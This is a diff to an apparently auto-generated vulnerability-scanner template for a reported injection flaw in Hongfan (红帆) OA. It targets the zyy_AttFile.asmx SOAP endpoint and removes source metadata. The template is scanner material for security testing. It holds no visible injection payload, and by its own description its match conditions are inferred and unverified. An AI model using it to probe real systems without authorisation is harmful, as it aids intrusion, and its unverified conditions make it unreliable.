@@ -3,14 +3,8 @@ info:
   name: 红帆 OA 注入
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/frarg4ugmcfr7lgt
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: frarg4ugmcfr7lgt
-    fofa: 暂无
 http:
 - raw:
   - 'POST /ioffice/prg/interface/zyy_AttFile.asmx HTTP/1.1
@@ -26,8 +20,6 @@ http:
 
 
     Connection: close
-
-
 
 
     <?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetFileAtt xmlns="http://tempuri.org/"><fileName>123</fileName></GetFileAtt> </soap:Body></soap:Envelope>
